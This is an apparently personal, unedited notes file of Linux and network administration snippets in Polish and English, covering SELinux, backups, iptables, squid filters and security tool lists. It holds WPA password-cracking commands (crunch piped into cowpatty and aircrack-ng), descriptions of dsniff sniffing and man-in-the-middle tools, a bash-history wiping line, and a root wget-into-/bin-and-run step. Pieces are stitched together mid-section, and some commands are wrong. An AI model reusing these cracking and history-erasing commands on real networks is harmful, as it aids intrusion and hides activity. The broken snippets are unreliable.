Jak widać, malware umiejscawia się w tzw. login shellu (profile.d) i aktualizuje swój kod przy każdym logowaniu użytkownika do zainfekowanego Linuksa. Złośliwe oprogramowanie najprawdopodobniej zmuszało zaatakowane Ubuntu do “pomocy” w przeprowadzaniu ataków DDoS.

---------------------------------

Szybkie poskromienie SELinuksa

SELinux to nakładka na linuksowe jądro, kontrolująca przydzielanie zasobów dla różnych aplikacji. Początkujący administratorzy systemów redhatopodobnych, jak CentOS czy Fedora niejednokrotnie stają przed poważnym problemem: jak uporać się z restrykcyjną polityką SELinuksa, który niczym Hubert Urbański w „Milionerach” będzie się dwieście razy pytał, czy „ostatecznie i definitywnie” pozwolić Apache’owi na dostęp do takiego czy innego katalogu?

Sam jestem amatorem, który nieraz miał ochotę wpisać set enforce 0, by przełączyć SELinuksa w tryb pobłażliwy, albo w ogóle się tego wynalazku pozbyć. Wychodzę jednak z założenia, że SELinux służy jednak czemuś pożytecznemu i lepiej spróbować z nim po dobroci. Na szczęście na ogół wystarczy odnaleźć w /var/log/messages komunikat z kodem dla programu sealert, który podaje gotowe rozwiązania, np. jaką opcję należy przełączyć za pomocą setsebool.

Są jednak przypadki, gdy porady sealert są zbyt enigmatyczne. W takich wypadkach FAQ Fedory radzi skorzystać z programu audit2allow. Zasada jest bardzo prosta. Najpierw generujemy zestaw regułek, które pozwalają obejść ostatnio napotkane błędy:

# audit2allow -m local -l -i /var/log/messages > local.te

Jeżeli nasz system korzysta z pliku /var/log/audit/audit.log to w nim program znajdzie potrzebne mu informacje:

# audit2allow -m local -l -i /var/log/audit/audit.log > local.te

Teraz możemy przejrzeć local.te i usunąć regułki, które nas nie interesują, by nie odblokować w systemie zbyt wielu zabezpieczeń.

Następnie upewniamy się, że mamy zainstalowany pakiet checkpolicy i kompilujemy moduł z naszymi regułkami, po czym generujemy paczkę:

# checkmodule -M -m -o local.mod local.te
# semodule_package -o local.pp -m local.mod

Na koniec dodajemy ją do obowiązującej w systemie polityki bezpieczeństwa (może to chwilę potrwać):

# semodule -i local.pp

Należy przy tym pamiętać, że jeżeli w pamięci jest już moduł o nazwie local, to zostanie nadpisany przez swoją nową wersję!

----------------------------

find . -name "*.c" -exec sed -i "/\/sh/a\####################################\n#Date:2010-05-18\n#Company:XXXXX tech Co.\n#Author:Wangjunling\n#Copyright:gpl\n####################################" {} \;

bat add copyright info

-----------------------------

Instalacja brakujących pakietów po przeinstalowaniu systemu
Posted 6 months, 1 week ago at 21:44. 0 comments

Krótkie howto jak wzbogacić system po przeinstalowaniu o brakujące pakiety z poprzedniego systemu. Natchnieniem do wpisu jest upgrade Ubuntu 9.04 do 910 jaki niedawno przeszedłem. Czytając o wielu problemach postanowiłem zainstalować 9.10 na osobnej partycji, nie odcinając się, w razie nie powodzenia, od działającego systemu ;)

Zaczytujemy listę wszystkich pakietów starego systemu do pliku old

dpkg --get-selections > old

Jeśli już jesteśmy po instalacji na nowej partycji, wystarczy się chroot’nąć na stary system i tam wykonać polecenie.

Analogicznie zaczytujemy listę pakietów nowego systemu do pliku current

dpkg --get-selections > current

Teraz porównujemy oba pliki wyrzucając różnice do pliku diff

grep -v -f current old > diff

Przeglądamy pliczek diff i doinstalowujemy ręcznie brakujące pakiety albo instalujemy hurtowo wskazując plik z różnicami:

dpkg --get-selections < diff

Metoda przydaje się jak np. reinstalujemy system i chcemy mieć stan z przed instalacji albo jak lubimy porządek, to robimy zrzut pakietów do pliku tuż po instalacji i po jakimś czasie poszukujemy jakie pakiety możemy usunąć ;)


---------------------------------------------

# Weekdays
30 02 * * 1-5 /sbin/shutdown -h now
# Weekends
30 04 * * 6-7 /sbin/shutdown -h now


--------------------------

Lista ostatnio utworzonych plików w systemie

find / -mtime -0,1 -print

--------------------------------------

informacje o systemie

factor

---------------------------------------

Tworzenie drzewa katalogów/plików

tree

---------------------------------------

Cairo-dock – dok a’la Mac OS

install cairo-dock cairo-dock-plug-ins

------------------------------

Odwrócony obraz w kamerze internetowej

    sudo -s

    cd /bin/


    wget http://codebin.cotescu.com/uvcvideo/flip_webcam

    chmod +x flip_webcam


    flip_webcam 1


-----------------------------------

Find the biggest files on your hard drive

find / -type f -size +500000k -exec ls -lh {} \; | awk '{ print $9 ": " $5 }'

--------------------------------------------


iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8118


----------------------------------------------

shutdown -i 5 -g 60 "System will be powered off for maintenance. LOGOUT NOW."


------------------------------------------

REMnux, lista narzędzi

Dystrybucja REMnux wspiera również analizę złośliwych dokumentów Microsoft Office, Adobe PDF oraz częściowo pozwala na analizę powłamaniową w oparciu o zrzuty pamięci. Poniżej wybór narzędzi wbudowanych w REMnuksa:

    * Analiza Flasha: swftools, flasm, flare
    * Analiza botnetów IRC: IRC server (Inspire IRCd) IRC client (Irssi).
    * Analiza ruchu sieciowego: Wireshark, Honeyd, INetSim, fakedns fakesmtp scripts oraz NetCat
    * Deobfuskacja Java Script: Firefox i Firebug, NoScript oraz JavaScript Deobfuscator, Rhino debugger, a także SpiderMonkey, Windows Script Decoder, Jsunpack-n
    * Web malware: TinyHTTPd, Paros proxy
    * Analiza shellkodu: gdb, objdump, Radare (hex editor+disassembler), shellcode2exe
    * Analiza oprogramowania: upx, packerid, bytehist, xorsearch, TRiD
    * Analiza plików PDF: Didier’s PDF tools, Origami framework, Jsunpack-n, pdftk
    * Analiza pamięci: Volatility Framework oraz malware-related plugins
    * Inne: unzip, strings, ssdeep, feh image viewer, SciTE text editor, OpenSSH server

REMnuksa ściągniesz stąd (VMware).
Dane logowania do systemu REMnux

login: remnux,
password: malware

-----------------------------------------

ftp do katalogu

    sudo curlftpfs ftp://użytkownik:hasło@adres_ftp /katalog/gdzie/ma/zostać/zamontowany/serwer

Odmontowanie:

    sudo umount /katalog/gdzie/zamontowany/jest/serwer

-------------------


Delete Files Older Than x Days on Linux

find /path/to/files* -mtime +5 -exec rm {} \;

----------------------------

Generate a Random MAC address

openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'

------------------------------

Increasing or Decreasing the Maximum Volume in Linux

alsamixer

---------------------------------

How To Reset The Gnome Panels

gconftool-2 --recursive-unset /apps/panel
killall gnome-panel

---------------------------


Ustawienia serwerów DNS znajdują się w pliku /etc/resolv.conf:

    sudo gedit /etc/resolv.conf

Ustawienie konkretnego serwera DNS, np. Open DNS - 208.67.222.222 208.67.220.220, wygląda tak:

    nameserver 208.67.222.222
    nameserver 208.67.220.220

Oczywiście powyższe linijki muszą znajdować się w pliku /etc/resolv.conf. Zapisz plik (CTRL + S) i aby uchronić go przed zmianą wydaj polecenie:

    sudo chattr +i /etc/resolv.conf
    sudo chattr +i /etc/ppp/resolv.conf

Aby odblokować:

    sudo chattr -i /etc/resolv.conf

------------------------------

export https_proxy='http://YOUR_USERNAME:YOUR_PASSWORD@PROXY_IP:PROXY_PORT/'
http_proxy='http://YOUR_USERNAME:YOUR_PASSWORD@PROXY_IP:PROXY_PORT/'


--------------------------------


Masowa zmiana praw dostępu do plików i katalogów

1	cd /home/ftp
2	for I in `find -type d` ; do chmod 755 $I ; done
3	for I in `find -type f` ; do chmod 644 $I ; done

-----------------------------------
How to block Messenger (Yahoo, Trillian, Skype , MSN , ICQ, Gizmo, AOL) using squid
Posted by Nikesh Jauhari
AOL Instant Messenger (AIM)
Note: AOL are known to change their Server IPs. The list below cannot be confirmed.

    # AOL
    acl aol dst 64.12.200.89/32 64.12.161.153/32 64.12.161.185/32
    acl aol dst 205.188.153.121/32 205.188.179.233/32
    http_access deny aol

Gizmo Project:
Gizmo Project include software to connect to a wide range of messaging protocols and VoIP services.

    # Gizmo Project
    acl gizmo dstdomain .gizmoproject.com
    # Gizmo VoIP
    acl gizmo dstdomain .talqer.com .gizmocall.com .fring.com
    # Gizmo Chat
    acl gizmo dstdomain .pidgin.im
    http_access deny gizmo

ICQ ("I Seek You")

    # ICQ
    acl icq dstdomain .icq.com
    http_access deny icq

MSN Messenger and Windows Live Messenger

    # MSN Messenger
    acl msn urlpath_regex -i gateway.dll
    acl msnd dstdomain messenger.msn.com gateway.messenger.hotmail.com
    acl msn1 req_mime_type application/x-msn-messenger

    http_access deny msnd
    http_access deny msn
    http_access deny msn1

Skype

    # Skype
    acl numeric_IPs dstdom_regex ^(([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)|(\[([0-9af]+)?:([0-9af:]+)?:([0-9af]+)?\])):443
    acl Skype_UA browser ^skype^

    http_access deny numeric_IPS
    http_access deny Skype_UA

Note: Recent releases of Skype have been evading the above restriction by not sending their User-Agent headers and using domain names. The following can be used to catch those installs, but be aware it will likely also catch other agents.

    acl validUserAgent browser \S+
    http_access deny !validUserAgent

Trillian

    # Trillian
    acl trillian dst 66.216.70.167/32
    http_access deny trillian

Yahoo! Messenger

    # Yahoo! Messenger
    acl ym dstdomain .messenger.yahoo.com .psq.yahoo.com
    acl ym dstdomain .us.il.yimg.com .msg.yahoo.com .pager.yahoo.com
    acl ym dstdomain .rareedge.com .ytunnelpro.com .chat.yahoo.com
    acl ym dstdomain .voice.yahoo.com

    acl ymregex url_regex yupdater.yim ymsgr myspaceim

    # Other protocols Yahoo!Messenger uses ??
    acl ym dstdomain .skype.com .imvu.com

    http_access deny ym
    http_access deny ymregex

-----------------------------------

dstat
stress --timeout 60s --hdd 1 --hdd-bytes 1G --verbose

sudo apt-get install bmon
yum install nethogs
 lynis --check-all
pidstat -p 2842 2
pidstat -d -p 2842 2
iptstate
 cpulimit --pid 2960 --limit 55 

dnstop
iftop
iptraf
dstat -taf --debug
dstat -dnyc -N eth0 -C total -f 5
dstat -M time,cpu,net,disk,sys,load,proc,topcpu
vnstat
lynis --check-all
iotop

bless 

sudo lsof -i -T -n

watch -n 1 "netstat -tpanl | grep ESTABLISHED"
watch -n 1 "lsof -Pnl +M -i4"

netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c \
 | awk '{ printf("%s\t%s\t",$2,$1) ; for (i = 0; i < $1; i++) {printf("*")}; print ""}'


tailf /var/log/kern.log | perl -pe 's/ACCEPT/\e[1;31;43m$&\e[0m/g'

alias connectAllMachines='Terminal --maximize -e "ssh server1" --tab -e "ssh server2" --tab -e "ssh server3"'

jnettop
findmnt

fuser -k <port>
kill -9 `lsof -t -i :port_number`

find . -type f -name "*.tar" -printf [%f]\\n -exec tar -tf {} \; | grep -iE "[\[]|<filename>"


---------------------------------
Quick Guide to compress / decompress files
Posted by Nikesh Jauhari
tar (tar)
tar Packaging
	
tar cvf archive.tar / archive / May / *
Unpack
	
tar xvf archive.tar
See the content (not extract)
	
tar tvf archive.tar
tar.gz -. tar.Z -. tgz (tar with gzip)
Pack and compress
	
tar czvf archive.tar.gz tar / archive / May / *
Unpack and decompress
	
tar xzvf archive.tar.gz
See the content (not extract)
	
tar tzvf archive.tar.gz
gz (gzip)
Compress
	
gzip file-q
(The file compresses it and rename it as "archive.gz")
Unzip
	
gzip-d archive.gz
 (The file unzip it and leave it as a "file")
Note: gzip only compresses files, not directories
bz2 (bzip2)
Compress
	
bzip2 file
bunzip2 file
(The file compresses it and rename it as "archive.bz2")
Unzip
	
bzip2-d archive.bz2
bunzip2 archive.bz2
(The file unzip it and leave it as a "file")
Note: only bzip2 compressed files, not directories
tar.bz2 (tar with bzip2)
Compress
	
tar-c files | bzip2> archive.tar.bz2
Unzip
	
bzip2-dc archive.tar.bz2 | tar-xv
tar jvxf archive.tar.bz2 (recent versions of tar)
View content
	
bzip2-dc archive.tar.bz2 | tar-tv
zip (zip)
Compress
	
zip archive.zip / May / files
Unzip
	
unzip archive.zip
View content
	
unzip-v archive.zip 
rar (rar)
Compress
	

plwar-vc03.domena.pl

-----------
dig @8.8.8.8 ewdp.domena.pl
dig ewdp.domena.pl MX
dig +trace domena.pl

-------------------------
rar-x archive.rar
View content
	
rar-v archive.rar
rar-l archive.rar 

-------------------------------
opis sprzętu
lshw

--------------------------------

Czyszczenie pamięci terminala

rm -f ~/.bash_history && touch ~/.bash_history && chmod 400 ~/.bash_history

---------------------------

proównanie katalogów
diff -q -r /dir1 /dir2


owszem to samo zadanie można wykonać przy pomocy chociażby rsync’a lub skorzystać z systemów IDS chociażby tripwire,samhain.

- drugi problem to jak przysłać np. plik z hostA do hostB nie wysycając całego dostępnego pasma oraz nie zużywając dużej ilości zasobów:

hostA# gzip -c file.1 | pv -L <limit_bajt/s> > /dev/tcp/<hostb_ip>/<hostb_port>

hostB# nc -l <hostb_port | gunzip > file.1


--------------------

Access remote Ubuntu using Shellinabox,A Web Based Terminal Emulator


http://code.google.com/p/shellinabox/downloads/list

----------------------

kill all process that belongs to you

ps -u $USER -lf | grep -vE "\-bash|sshd|ps|grep|PPID" > .tmpkill; if (( $(cat .tmpkill | wc -l) > 0 )); then echo "# KILL EM ALL"; cat .tmpkill; cat .tmpkill | awk '{print $4}' | xargs kill -9; else echo "# NOTHING TO KILL"; fi; cat .tmpkill; rm .tmpkill;

-----------------------

Command to logout all the users in one command

who -u|grep -v root|awk {'print $6'}|kill  `awk {'print $0'}`

-------------------------------------

memory use

ps -e -orss=,args= | sort -b -k1,1n | pr -TW$COLUMNS

Show CPU usage for EACH cores

ps ax -L -o pid,tid,psr,pcpu,args | sort -nr -k4| head -15 | cut -c 1-90

----------------------------------

http://www.varlog.pl/2010/12/przyrostowe-backupy-z-dump8-i-lvm/?utm_source=feedburner&utm_medium=feed

#!/bin/bash
# taki skrypt w cronie należy uruchamiać co trzy godziny:
# 0 */3 * * * /czarodziejka/backup_home.sh
 
LEVEL=$(( `date +%k` / 3 + `date +%w` * 8 ))
# Ustawiamy poziom na (bieżąca godzina/3 + dzień tygodnia*8)
# czyli w nocy z niedzieli na poniedziałek tworzymy pełną kopię
# i przez resztę tygodnia co trzy godziny inkrementalne
 
TIMESTAMP=`date +%F`
FILENAME=`hostname`_home_${TIMESTAMP}_${LEVEL}.lzo
# nazwa pliku z backupem
# bardzo ważne jest zawarcie numeru poziomu w nazwie
# znacznie ułatwi to nam późniejsze odzyskiwanie
# dobrym pomysłem jest też użycie np. numeru dnia tygodnia zamiast timestampa
 
lvcreate -s -nhome-snapshot -L10G /dev/vg/home
# tworzymy snapshot wolumenu /dev/vg/home
# 10GB powinno wystarczyć na zmiany w /home na czas tworzenia backupu
 
mount -o ro /dev/vg/home-snapshot /home-snapshot
# stworzyliśmy i zamontowaliśmy w read-only snapshot partycji /home
 
dump -$LEVEL -y -u -f /backup/$FILENAME /home-snapshot
# użyte opcje to:
# -$LEVEL określa poziom <em>dump</em>
# -y kompresuje za pomocą LZO
# -u aktualizuje plik /etc/dumpdates po wykonaniu dumpa (WAŻNE!)
# -f wskazuje plik docelowy
# /home-snapshot to zamontowana partycja którą backupujemy
 
umount /home-snapshot
lvremove -f /dev/vg/home-snapshot
# odmontowane, snapshot usunięty - posprzątane :)
---


Odzyskiwanie z takiego backupu przebiega w kilku prostych krokach. Po pierwsze należy upewnić się że używamy tych samych wersji narzędzi co na oryginalnej maszynie. Należy rozpocząć od przygotowania partycji – musi ona być czysta, więc najlepiej sformatować ją chwilę przed odtwarzaniem.

umount /home
mkfs.ext4 /dev/vg/home
mount /home

Potem należy wejść do katalogu i odtworzyć ostatnią pełną kopię, tą z poziomu 0.

cd /home
restore rf /backup/czarodziejka_home_2012-12-12_0.lzo
# r mówi że odzyskujemy cały system plików
# f wskazuje plik źródłowy

Następnie tym samym poleceniem należy po kolei odtwarzać kolejne dumpy w kolejności ich poziomów. Po skończeniu można usunąć plik restoresymtable w którym restore trzyma informacje o odtwarzanych plikach.

---------------------------------------------

Dual Monitor

xrandr --output DVI-0 --auto --rotate normal --pos 0x0 --primary --output VGA-0  --auto  --rotate  normal --right-of DVI-0

Disable Monitor

xrandr --output VGA-0 --off

film 
xrandr --output DVI-0 --auto --rotate normal --pos 0x0 --primary --output VGA-0  --mode 800x600  --rotate  normal --right-of DVI-0

-------------------------------------

A simple and easy way to copy a file system between two Linux servers

cpdup -C -vv -d -I /data 192.168.56.3:/data

root@192.168.56.3's password:
Handshaked with fedora2
/data
Scanning /data ...
Scanning /data/conf ...
/data/conf/main.cf.conf          copy-ok
/data/conf/smb.conf              copy-ok
/data/conf/named.conf            copy-ok
Scanning /data/www ...
Scanning /data/www/content ...
Scanning /data/www/cgi-bin ...
Scanning /data/dns ...
/data/lost+found
Scanning /data/lost+found ...
cpdup completed successfully
1955847 bytes source, 1955847 src bytes read, 0 tgt bytes read
1955847 bytes written (1.0X speedup)
3 source items, 8 items copied, 0 items linked, 0 things deleted
3.8 seconds  1007 Kbytes/sec synced   503 Kbytes/sec scanned

-------------------------------
    * arpspoof - Send out unrequested (and possibly forged) arp replies.
    * dnsspoof - forge replies to arbitrary DNS address / pointer queries on the Local Area Network.
    * dsniff - password sniffer for several protocols.
    * filesnarf - saves selected files sniffed from NFS traffic.
    * macof - flood the local network with random MAC addresses.
    * mailsnarf - sniffs mail on the LAN and stores it in mbox format.
    * msgsnarf - record selected messages from different Instant Messengers.
    * sshmitm - SSH monkey-in-the-middle. proxies and sniffs SSH traffic.
    * sshow - SSH traffic analyser.
    * tcpkill - kills specified in-progress TCP connections.u
    * tcpnice - slow down specified TCP connections via "active" traffic shaping.
    * urlsnarf - output selected URLs sniffed from HTTP traffic in CLF.
    * webmitm - HTTP / HTTPS monkey-in-the-middle. transparently proxies.
    * webspy - sends URLs sniffed from a client to your local browser (requires libx11-6 installed).

---------------------------------------

./cowpatty -d /media/disk/WPA_tables/default.wpa -r ~/default-01.cap -s default

/pentest/passwords/crunch/./crunch 8 8 0123456789ABCDEF | /pentest/wireless/cowpatty/./cowpatty -f - -r ~/capfile.cap -s essid

./cowpatty -f /media/disk/WORDLISTS/wpalist.txt -r ~/default-01.cap -s default


./cowpatty -f /media/disk/WORDLISTS/wpalist.txt -r ~/default-01.cap -s default

crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng -e TestNet -w - mycapfile.cap



aircrack-ng -w pass /mnt/onetpl-02.cap

cowpatty -f pass -r /mnt/onetpl-02.cap -s onetpl


http://ocw.novell.com/suse-linux-enterprise/


*Strony internetowe z usługą testowania stron i walidacji* 

NetMechanic Online http://www.netmechanic.com/maintain.htm
Sprawdzanie poprawności HTML, kompatybilności z przeglądarkami, czasu 
ładowania strony, testowanie odnośników oraz sprawdzanie pisowni w języku 
angielskim.
Dr. Watson http://watson.addy.com/
Sprawdzanie poprawność kodu HTML, czasu ładowania strony, poprawności 
odnośników, weryfikacja odnośników do plików graficznych, sprawdzanie 
popularności strony oraz pisowni w języku angielskim.
Websitegarage http://www.websitegarage.com/
Sprawdzanie poprawność kodu HTML, czasu ładowania strony, poprawności 
odnośników, popularności strony, pisowni w języku angielskim, możliwość 
porównania wyglądu strony w różnych przeglądarkach, generacja znaczników 
META, GIF Lube (optymalizacja grafiki) oraz comiesięczne raporty pocztą 
elektroniczną.
WDG HTML Validator - http://www.htmlhelp.com/tools/validator/
Zdalny walidator HTML na stronie HTMLhelp.
CAST Bobby http://www.cast.org/bobby/
Sprawdzanie poprawności kodu HTML, kompatybilności z różnymi przeglądarkami 
oraz czasu ładowania strony.
CSSCheck - http://htmlhelp.com/tools/csscheck/
Sprawdzanie poprawności stylów możemy podać adres URL, pod którym znajduje 
się nasz plik ze stylami lub wkleić bezpośrednio jego zawartość. Możesz 
także ściągnąć ten program na dysk lokalny.
Delorie - http://www.delorie.com/web/
Sprawdzanie poprawność kodu HTML, możliwość porównania wyglądu strony w 
różnych przeglądarkach, symulacja wyszukiwarek (możesz sprawdzić co widzą 
wyszukiwarki przeglądając Twoją stronę).
GIF Wizard SiteScan http://www.gifwizard.com/
Sprawdzanie poprawności odnośników oraz wyszukiwanie grafiki, która nie jest 
zoptymalizowana.
MetaMedic http://www.northernwebs.com/set/setsimjr.html
Sprawdzanie poprawności znaczników META.
Mizer - http://www.antimonysoftware.com/mizer.html
Usuwanie zbędnych informacji z kodu HTML oraz JavaScripts.
Site Inspector - http://www.siteinspector.com/
Sprawdzanie poprawność kodu HTML, kompatybilności z przeglądarkami, 
poprawności odnośników, czasu ładowania, popularności strony oraz tego, jak 
jest czytana przez wyszukiwarki.
cg-eye - http://www.htmlhelp.com/tools/cgeye/
Sprawdzanie poprawności skryptów CGI.


---------------
scrubbu - super download
smb://domena;userj@172.17.40.101/d$/
smb://domena;user@172.17.40.101/d$/

-------------------
darmowy hosting
www.cba.pl
yoyo.pl
just.pl

------------------
dsniff is a collection of tools for network auditing and penetration testing. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data (passwords, e-mail, files, etc.).

    * arpspoof - redirect packets from a target host (or all hosts) on the LAN intended for another local host by forging ARP replies
    * dnsspoof - forge replies to arbitrary DNS address / pointer queries on the LAN
    * dsniff - password sniffer. handles FTP, Telnet, SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP, MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL, Meeting Maker, Citrix ICA, Symantec pcAnywhere, NAI Sniffer, Microsoft SMB, Oracle SQL*Net, Sybase and Microsoft SQL auth info
    * filesnarf - saves selected files sniffed from NFS traffic in the current working directory
    * macof - flood the local network with random MAC addresses (causing some switches to fail open in repeating mode, facilitating sniffing)
    * mailsnarf - a fast and easy way to violate the Electronic Communications Privacy Act of 1986
    * msgsnarf - record selected messages from sniffed AOL Instant Messenger, ICQ 2000, IRC, and Yahoo! Messenger chat sessions
    * sshmitm - SSH monkey-in-the-middle. proxies and sniffs SSH traffic redirected by dnsspoof, capturing SSH password logins, and optionally hijacking interactive sessions
    * tcpkill - kills specified in-progress TCP connections
    * tcpnice - slow down specified TCP connections via "active" traffic shaping
    * urlsnarf - output selected URLs sniffed from HTTP traffic in CLF (Common Log Format, used by almost all web servers)
    * webmitm - HTTP / HTTPS monkey-in-the-middle. transparently proxies and sniffs web traffic redirected by dnsspoof, capturing most "secure" SSL-encrypted webmail logins and form submissions
    * webspy - sends URLs sniffed from a client to your local browser for display

-----
Anti-Malware
chkrootkit 	Check for signs of a rootkit
OSSEC 	Rootkit detection
Nixory 	Anti Spyware program open source for Mozilla Firefox
rkhunter 	Scans for rootkits, backdoors and possible local exploits

Encryption
GnuPG 	Encrypt and sign data and communication
MailCrypt 	Simple interface to public key cryptography with PGP
MCrypt 	Developer tool for adding a wide range of encryption functions
OpenSignature 	Digital signature of documents
PeaZip 	Portable, open source archiving, encryption and file split tool
Seahorse 	GNOME application for managing encryption keys
Steghide 	Hide data in various kinds of image- and audio-files
Stunnel 	Encrypt arbitrary TCP connections inside SSL (Secure Sockets Layer)
TrueCrypt 	Disk encryption software

Firewalls / Network Gateways
ClarkConnect 	Dedicated firewall and Internet server/gateway
FireHOL 	Stateful iptables packet filtering firewall configurator
Firestarter 	Visual firewall program
Netfilter 	Packet filtering framework
IPCop
	Linux firewall distribution
ShellTer 	Iptables-based firewall supporting port forwarding, blacklisting, whitelisting
Shorewall 	High-level tool for configuring Netfilter
Untangle 	Commercial-grade open source alternative to SonicWALL and WatchGuard
Turtle Firewall 	Firewall configuration project based on Linux 2.4.x/2.6.x and iptables
Vuumuur 	Powerful firewall manager built on top of iptables

Intrustion Detection
AFICK 	Monitor the changes on your filesystems
BASE 	Web front-end to query and analyze the alerts from a SNORT IDS system
Bro 	Passively monitors network traffic and looks for suspicious activity
Kismet 	Wireless network detector, sniffer, and intrusion detection system
OSSEC 	Open Source Host-based Intrusion Detection System
Sguil 	Analyst Console for Network Security Monitoring
SNARE 	System iNtrusion Analysis and Reporting Environment
Snort 	Network intrusion prevention and detection
Snort_inline 	Modified version of Snort
Tripwire 	Provides configuration audit and control features
	
Network Monitoring
AIM Sniff 	Monitoring and archiving AOL Instant Messenger and MSN messages
Argus 	Fixed-model Real Time Flow Monitor
Nagios 	Host and network monitoring tool
Nipper 	Network Infrastructure Configuration Parser
NSAT 	Network Security Analysis Tool
ntop 	Network traffic probe that shows the network usage
SEC 	Simple Event Correlator
SniffDet 	Remote Sniffer Detection Tool/Library
tcpdump 	Network debugging tool

Network Traffic Analyzer
dsniff 	Collection of tools for network auditing and penetration testing
Ettercap 	Multipurpose sniffer/interceptor/logger for switched LAN
ngrep 	Network grep
Kismet 	Wireless network detector, sniffer, and intrusion detection system
Wireshark 	Network protocol analyzer

Packet Crafting
Hping3 	TCP/IP packet assembler/analyzer
Nemesis 	Packet crafting and injection utility
Scapy 	Interactive packet manipulation program
Yersinia 	Network tool to take advantage of weaknesses in network protocols
Portscanner
Angry IP Scanner 	Fast and friendly network scanner
Knocker 	TCP security port scanner
Unicornscan 	User-land Distributed TCP/IP stack for information gathering and correlation
	
Vulnerability Scanner
Nessus 	Comprehensive vulnerability scanning software
SARA 	Third generation security analysis tool that is based on the SATAN model
Tiger 	Perform a security audit of UNIX systems

Log File Analyzers
AWStats 	Advanced web, streaming, ftp or mail server statistics, graphically
IPtables Log Analyzer 	Analyzes the log output from an iptables firewall
tcpreplay 	Use previously captured traffic in libpcap format to test network devices
tcptrace 	Analyze TCP dump files
The Webalizer 	Web server log file analysis
Data Removal
Darik's Boot and Nuke 	Self-contained boot floppy that securely wipes hard disks
Wipe 	Secure file wiping utility

Password Management
Figaro's Password Manager 	GNOME application that allows password to be securely stored
KeePassX  	Lightweight and easy-to-use password manager
VPN Tools
Poptop 	PPTP server solution
OpenVPN 	Full-featured SSL VPN solution
SSL Explorer 	Fully-featured, web-based SSL VPN server
	
Forensics
ODESSA 	Open Digital Evidence Search and Seizure Architecture
Other Tools
Denyhosts 	SSH attack prevention
iptables 	Configure the Netfilter tables, chains, and rules
mtr 	Network diagnostic tool
Netcat 	Reads and writes data across network connections
Nikto 	Web server scanner performing comprehensive tests against web servers
OpenSSH 	SSH connectivity tools
Smart Sign 	Smartcard based digital signature

-----------------------
------------------------------------

  Block everything firewall

This blocks everything. You will only be able to access the machine from the console. Don't do this if you are working remotely because your connection will instantly be dropped. Another way to do this would be to disable the network interface. The advantage of blocking everything with iptables instead of shutting down a network interface is that this leaves the kernel network layer still running. Applications will not complain about the network being unavailable. This also blocks all network interfaces at once, so if you have a machine with multiple interfaces this will take care of them all.

#!/bin/sh
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
iptables -X
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

Allow everything firewall

This opens up everything. It's the exact opposite of Block everything. The firewall is still technically running, but every packet is allowed through. This is the safe way to open the firewall without accidentally locking yourself out.

#!/bin/sh
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
iptables -X

Minimal emergency firewall

I use this to shut down everything except SSH port 22. This is my panic script. If something seems suspicious then I use this script to put a machine into as safe a state as possible while still allowing remote SSH connections.

Note that a machine with these rules won't be visible on the network with ping. Nmap by default does a ping test before mapping a machine. If you want to scan it with nmap you will have to use "nmap -P0" to scan without first checking ping.

#!/bin/sh
# Minimal emergency firewall (block everything except SSH).
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -F
iptables -X
iptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -p tcp -m tcp --sport 22 -j ACCEPT
iptables -P OUTPUT DROP

A practical, simple iptables firewall init.d script

For my real firewall I use an init.d script to store the configuration and to load the rules when the system boots. RedHat has a similar mechanism setup by default. Oddly, Ubuntu has no standard for restoring iptables rules on boot which is why I wrote this script to begin with. It turned out that I liked storing the rules this way better than I liked the RedHat style anyway.

To restore rules on boot, copy this script to /etc/init.d/firewall. On Ubuntu or Debian systems, run "update-rc.d firewall defaults" and the system will from then on start loading the firewall rules on boot. On RedHat systems, run "chkconfig --add firewall" and the system will run the script on boot.

This script includes options to start, stop, and show the status of iptables. The "stop" command doesn't really stop iptables (it is not a daemon). In this case, "stop" just flushes all policies and rules which opens networking to all traffic.

Click here to download: firewall

#!/bin/sh
#
# This is a simple iptables firewall script. This can be used stand-alone and
# it can be use as an init.d script to restore firewall settings on boot. This
# is designed to be simple and put a familiar init.d interface around iptables.
# These default firewall settings are indented for an isolated system exposed
# to an untrusted WAN. Only a few critical incoming ports are left open. This
# script includes options to start, stop, and show the status of iptables. The
# "stop" command doesn't really stop iptables (it is not a daemon). In this
# case, "stop" just flushes all policies and rules which opens networking to
# all traffic.
#
# This has been tested on Ubuntu and RedHat systems. To restore rules on boot,
# copy this script to /etc/init.d/firewall. On Ubuntu or Debian systems, run
# "update-rc.d firewall defaults" and the system will start loading the
# firewall rules on boot. On RedHat systems, run "chkconfig --add firewall" and
# the system will start loading the firewall rules on boot.
#
# Note that RedHat has its own iptables init.d script that must be turned off
# if this script is to be used. Alternatively, you can run this script with the
# 'rhsave' option to save the current iptables rules using RedHat's init.d
# script. Be sure to run 'firewall start' before 'firewall rhsave' to set
# the current iptables rules.
#
# Noah Spurrier
# $Id: firewall 342 2008-10-28 22:53:53Z root $
#
# chkconfig: 2345 08 92
# description: This loads iptables firewall rules.
#
### BEGIN INIT INFO
# Provides:          firewall
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      S 0 1 6
# Short-Description: This loads iptables firewall rules.
# Description:       This loads iptables firewall rules.
#
### END INIT INFO
 
PATH=/usr/sbin:/usr/bin:/sbin:/bin
 
case "$1" in
  start)
    #
    # Flush old policies and rules.
    # Get iptables cleaned and ready for new rules.
    #
    iptables -P INPUT ACCEPT
